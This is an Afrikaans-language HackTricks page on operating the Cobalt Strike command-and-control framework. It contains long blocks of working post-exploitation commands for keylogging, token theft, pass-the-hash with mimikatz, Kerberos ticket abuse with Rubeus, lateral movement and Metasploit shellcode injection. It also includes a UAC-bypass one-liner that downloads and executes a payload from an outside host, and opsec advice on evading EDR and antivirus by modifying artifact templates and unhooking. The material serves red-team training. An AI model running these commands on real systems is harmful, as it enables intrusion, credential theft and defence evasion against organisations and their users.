# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` dan kan jy kies waar om te luister, watter soort beacon om te gebruik (http, dns, smb...) en meer.

### Peer2Peer Listeners

Die beacons van hierdie listeners hoef nie direk met die C2 te kommunikeer nie; hulle kan daardeur via ander beacons kommunikeer.

`Cobalt Strike -> Listeners -> Add/Edit` dan moet jy die TCP- of SMB-beacons kies

* Die **TCP beacon sal 'n listener op die gekose poort instel**. Om aan 'n TCP beacon te koppel, gebruik die opdrag `connect <ip> <port>` vanaf 'n ander beacon
* Die **smb beacon sal op 'n pipenaam met die gekose naam luister**. Om aan 'n SMB beacon te koppel, moet jy die opdrag `link [target] [pipe]` gebruik.

### Genereer & Host payloads

#### Genereer payloads in lêers

`Attacks -> Packages ->`

* **`HTMLApplication`** vir HTA-lêers
* **`MS Office Macro`** vir 'n Office-dokument met 'n makro
* **`Windows Executable`** vir 'n .exe, .dll of diens-.exe
* **`Windows Executable (S)`** vir 'n **stageless** .exe, .dll of diens-.exe (stageless is beter as staged, met minder IoCs)

#### Genereer & Host payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` Dit sal 'n script/uitvoerbare lêer genereer om die beacon vanaf Cobalt Strike af te laai in formate soos: bitsadmin, exe, powershell en python

#### Host Payloads

As jy reeds die lêer het wat jy op 'n webbediener wil host, gaan bloot na `Attacks -> Web Drive-by -> Host File` en kies die lêer om te host en die webbedienerkonfigurasie.

### Beacon-opsies

<details>
<summary>Beacon-opsies en -opdragte</summary>
```bash
# Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots
printscreen    # Take a single screenshot via PrintScr method
screenshot     # Take a single screenshot
screenwatch    # Take periodic screenshots of desktop
## Go to View -> Screenshots to see them

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # Uses the highest supported PowerShell version (not OPSEC-friendly)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Without /run, Mimikatz spawns cmd.exe; an interactive desktop user may see the shell (SYSTEM sessions are not normally visible)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket on the attacker machine from a PowerShell session and load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump an interesting ticket by LUID
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## If a token was created it will be used
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact
## psexec64                  x64   Use a service to run a Service EXE artifact
## psexec_psh                x86   Use a service to run a PowerShell one-liner
## winrm                     x86   Run a PowerShell script via WinRM
## winrm64                   x64   Run a PowerShell script via WinRM
## wmi_msbuild               x64   WMI lateral movement with an MSBuild inline C# task (OPSEC)


remote-exec [method] [target] [command] # remote-exec doesn't return output
## Methods:
## psexec                          Remote execute via Service Control Manager
## winrm                           Remote execute via WinRM (PowerShell)
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## On the Metasploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
beacon> spawn metasploit
## You can only spawn x86 Meterpreter sessions with the foreign listener.

# Pass session to Metasploit - Through shellcode injection
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Pass metasploit session to cobalt strike
## Generate stageless Beacon shellcode: go to Attacks > Packages > Windows Executable (S), select the listener, choose Raw output, and enable the x64 payload.
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode


# Pivoting
## Open a socks proxy in the teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password
```
</details>

### Custom implants / Linux Beacons

- 'n Custom agent hoef slegs die Cobalt Strike Team Server HTTP/S-protokol (verstek malleable C2 profile) te gebruik om te registreer/check-in en take te ontvang. Implementeer dieselfde URIs/headers/metadata crypto wat in die profile gedefinieer is om die Cobalt Strike UI vir tasking en output te hergebruik.<sup>[[1]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>
- 'n Aggressor Script (byvoorbeeld `CustomBeacon.cna`) kan payload generation vir die non-Windows beacon omvou sodat operators die listener kan kies en ELF payloads direk vanaf die GUI kan produseer.
- Voorbeeld van Linux task handlers wat aan die Team Server blootgestel word: `sleep`, `cd`, `pwd`, `shell` (voer arbitrêre commands uit), `ls`, `upload`, `download` en `exit`. Dit map na task IDs wat deur die Team Server verwag word en moet server-side geïmplementeer word om output in die korrekte formaat terug te stuur.
- BOF support op Linux kan bygevoeg word deur Beacon Object Files in-process met [TrustedSec's ELFLoader](https://github.com/trustedsec/ELFLoader) te laai (dit ondersteun ook Outflank-style BOFs), sodat modular post-exploitation binne die implant se context/privileges kan loop sonder om nuwe prosesse te spawn.<sup>[[2]](#references)[[3]](#references)</sup>
- Embed 'n SOCKS handler in die custom beacon om pivoting parity met Windows Beacons te behou: wanneer die operator `socks <port>` uitvoer, moet die implant 'n local proxy oopmaak om operator tooling deur die compromised Linux host na interne networks te routeer.

## Opsec

### Execute-Assembly

Die **`execute-assembly`** gebruik 'n **sacrificial process** met remote process injection om die aangeduide program uit te voer. Dit is baie noisy, want om binne 'n process te inject word sekere Win APIs gebruik wat elke EDR nagaan. Daar is egter 'n paar custom tools wat gebruik kan word om iets in dieselfde process te laai:

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- In Cobalt Strike kan jy ook BOF (Beacon Object Files) gebruik: [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)

Die agressor script `https://github.com/outflanknl/HelpColor` skep die `helpx` command in Cobalt Strike, wat colors in commands plaas om aan te dui of hulle BOFs (green), Frok&Run (yellow) en soortgelyke commands is, of ProcessExecution, injection en soortgelyke commands (red) is. Dit help om te weet watter commands meer stealthy is.

### Tree op soos die user

Jy kan events soos `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents` nagaan:

- Security EID 4624 - Gaan al die interactive logons na om die gewone operating hours te bepaal.
- System EID 12,13 - Gaan die shutdown/startup/sleep frequency na.
- Security EID 4624/4625 - Gaan inbound valid/invalid NTLM attempts na.
- Security EID 4648 - Hierdie event word geskep wanneer plaintext credentials gebruik word om aan te meld. As 'n process dit gegenereer het, bevat die binary moontlik die credentials in clear text in 'n config file of binne die code.

Wanneer `jump` vanaf cobalt strike gebruik word, is dit beter om die `wmi_msbuild` method te gebruik om die nuwe process meer legit te laat lyk.

### Gebruik computer accounts

Dit is algemeen dat defenders vreemde behaviour wat deur users gegenereer word, nagaan en **service accounts en computer accounts soos `*$` van hul monitoring uitsluit**. Jy kan hierdie accounts gebruik om lateral movement of privilege escalation uit te voer.

### Gebruik stageless payloads

Stageless payloads is minder noisy as staged payloads omdat hulle nie 'n second stage van die C2 server hoef af te laai nie. Dit beteken dat hulle geen network traffic ná die aanvanklike connection genereer nie, wat hulle minder geneig maak om deur network-based defenses opgespoor te word.

### Tokens & Token Store

Wees versigtig wanneer tokens gesteel of gegenereer word, want 'n EDR kan thread tokens enumerate en 'n **token wat aan 'n ander user behoort** of selfs SYSTEM binne die process opspoor.

Dit maak dit moontlik om tokens **per beacon** te stoor sodat dit nie nodig is om dieselfde token oor en oor te steel nie. Dit is nuttig vir lateral movement of wanneer jy 'n gesteelde token herhaaldelik moet gebruik:

- `token-store steal <pid>`
- `token-store steal-and-use <pid>`
- token-store show
- `token-store use <id>`
- `token-store remove <id>`
- token-store remove-all

Wanneer jy laterally move, is dit gewoonlik beter om **'n token te steel as om 'n nuwe een te genereer** of 'n pass the hash attack uit te voer.

### Guardrails

Cobalt Strike het 'n feature genaamd **Guardrails** wat help om die gebruik van sekere commands of actions te voorkom wat deur defenders opgespoor kan word. Guardrails kan gekonfigureer word om spesifieke commands te block, soos `make_token`, `jump`, `remote-exec` en ander wat algemeen vir lateral movement of privilege escalation gebruik word.

Verder bevat die repo [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) ook 'n paar checks en ideas wat jy kan oorweeg voordat jy 'n payload uitvoer.

### Tickets encryption

Wees in 'n AD versigtig met die encryption van tickets. By verstek sal sommige tools RC4 encryption vir Kerberos tickets gebruik, wat minder secure as AES encryption is, en bygewerkte environments sal by verstek AES gebruik. Dit kan deur defenders opgespoor word wat vir weak encryption algorithms monitor.

### Vermy Defaults

Wanneer Cobalt Stricke gebruik word, sal die SMB pipes by verstek die name `msagent_####` en `"status_####"` hê. Verander daardie names. Dit is moontlik om die names van die bestaande pipes vanaf Cobal Strike met die command `ls \\.\pipe\` na te gaan.

Verder word 'n pipe genaamd `\\.\pipe\postex_ssh_####` met SSH sessions geskep. Verander dit met `set ssh_pipename "<new_name>";`.

Ook in poext exploitation attack kan die pipes `\\.\pipe\postex_####` met `set pipename "<new_name>"` gewysig word.

In Cobalt Strike profiles kan jy ook dinge soos die volgende wysig:

- Vermy die gebruik van `rwx`
- Hoe die process injection behavior werk (watter APIs gebruik sal word) in die `process-inject {...}` block
- Hoe die "fork and run" werk in die `post-ex {…}` block
- Die sleep time
- Die maksimum size van binaries wat in memory gelaai word
- Die memory footprint en DLL content met die `stage {...}` block
- Die network traffic

### Bypass memory scanning

Sommige ERDs scan memory vir bekende malware signatures. Coblat Strike laat jou toe om die `sleep_mask` function as 'n BOF te wysig sodat dit die bacldoor in memory kan encrypt.

### Noisy proc injections

Wanneer code in 'n process geïnject word, is dit gewoonlik baie noisy, omdat **geen gewone process hierdie action gewoonlik uitvoer nie en omdat die maniere om dit te doen baie beperk is**. Gevolglik kan dit deur behaviour-based detection systems opgespoor word. Dit kan ook deur EDRs opgespoor word wat die network scan vir **threads wat code bevat wat nie op disk is nie** (hoewel prosesse soos browsers wat JIT gebruik dit algemeen doen). Voorbeeld: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | PID en PPID relationships

Wanneer 'n nuwe process gespawn word, is dit belangrik om 'n **normale parent-child** relationship tussen prosesse te **behou** om detection te vermy. As svchost.exec iexplorer.exe uitvoer, sal dit suspicious lyk, aangesien svchost.exe nie in 'n normale Windows environment 'n parent van iexplorer.exe is nie.

Wanneer 'n nuwe beacon in Cobalt Strike gespawn word, word 'n process wat **`rundll32.exe`** gebruik by verstek geskep om die nuwe listener te run. Dit is nie baie stealthy nie en kan maklik deur EDRs opgespoor word. Verder word `rundll32.exe` sonder enige args uitgevoer, wat dit selfs meer suspicious maak.

Met die volgende Cobalt Strike command kan jy 'n ander process spesifiseer om die nuwe beacon te spawn, wat dit minder detectable maak:
```bash
spawnto x86 svchost.exe
```
Jy kan ook hierdie instelling **`spawnto_x86` en `spawnto_x64`** in ’n profiel verander.

### Proxying aanvallers se verkeer

Aanvallers sal soms tools plaaslik moet kan uitvoer, selfs op Linux-masjiene, en die slagoffers se verkeer na die tool moet laat gaan (bv. NTLM relay).

Boonop is dit soms meer stealthy vir die aanvaller om **hierdie hash of ticket in sy eie LSASS-proses** plaaslik by te voeg en dan daarvandaan te pivot, eerder as om ’n LSASS-proses op ’n slagoffer se masjien te wysig.

Jy moet egter **versigtig wees met die gegenereerde verkeer**, aangesien jy moontlik ongewone verkeer (Kerberos?) vanaf jou backdoor-proses kan stuur. Hiervoor kan jy na ’n browser-proses pivot (hoewel jy gevang kan word terwyl jy jouself in ’n proses inject, dus moet jy aan ’n stealthy manier dink om dit te doen).


### Vermyding van AV's

#### AV/AMSI/ETW Bypass

Gaan die bladsy na:


{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

Gewoonlik kan jy in `/opt/cobaltstrike/artifact-kit` die kode en vooraf-gecompileerde templates (in `/src-common`) van die payloads vind wat cobalt strike gaan gebruik om die binary beacons te genereer.

Deur [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) saam met die gegenereerde backdoor (of slegs met die gecompileerde template) te gebruik, kan jy vind wat veroorsaak dat Defender trigger. Dit is gewoonlik ’n string. Jy kan dus eenvoudig die kode wat die backdoor genereer, wysig sodat daardie string nie in die finale binary verskyn nie.

Nadat jy die kode gewysig het, voer bloot `./build.sh` vanuit dieselfde gids uit en kopieer die `dist-pipe/`-gids na die Windows-kliënt in `C:\Tools\cobaltstrike\ArtifactKit`.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
Moenie vergeet om die aggressiewe script `dist-pipe\artifact.cna` te laai om aan te dui dat Cobalt Strike die hulpbronne vanaf die skyf moet gebruik wat ons wil hê, en nie dié wat gelaai is nie.

#### Hulpbronstel

Die ResourceKit-lêergids bevat die templates vir Cobalt Strike se script-gebaseerde payloads, insluitend PowerShell, VBA en HTA.

Deur [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) saam met die templates te gebruik, kan jy uitvind waarvan Defender (AMSI in hierdie geval) nie hou nie en dit wysig:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
Deur die bespeurde lyne te wysig, kan ’n mens ’n template genereer wat nie opgespoor sal word nie.

Moenie vergeet om die aggressive script `ResourceKit\resources.cna` te laai nie, sodat Cobalt Strike aangedui word om die resources vanaf die skyf te gebruik wat ons wil hê, en nie dié wat gelaai is nie.

#### Function hooks | Syscall

Function hooking is ’n baie algemene metode wat EDRs gebruik om kwaadwillige aktiwiteit op te spoor. Cobalt Strike laat jou toe om hierdie hooks te omseil deur **syscalls** in plaas van die standaard Windows API calls te gebruik met die **`None`**-config, of om die `Nt*`-weergawe van ’n function met die **`Direct`**-setting te gebruik, of bloot oor die `Nt*`-function te spring met die **`Indirect`**-opsie in die malleable profile. Afhangend van die system, kan een opsie meer stealthy as ’n ander wees.

Dit kan in die profile gestel word of met die command **`syscall-method`**

Dit kan egter ook noisy wees.

Een opsie wat Cobalt Strike bied om function hooks te omseil, is om daardie hooks te verwyder met: [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

Jy kan ook met functions kontroleer watter een hooked is met [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) of [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)




<details>
<summary>Diverse Cobalt Strike commands</summary>
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```
</details>

## References

- [1] [Cobalt Strike Linux Beacon (custom implant PoC)](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
- [2] [TrustedSec ELFLoader & Linux BOFs](https://github.com/trustedsec/ELFLoader)
- [3] [Outflank nix BOF-sjabloon](https://github.com/outflanknl/nix_bof_template)
- [4] [Unit42-analise van Cobalt Strike-metadata-enkripsie](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
- [5] [SANS ISC-dagboek oor Cobalt Strike-verkeer](https://isc.sans.edu/diary/27968)
- [6] [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
- [7] [SentinelOne CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)
{{#include ../banners/hacktricks-training.md}}
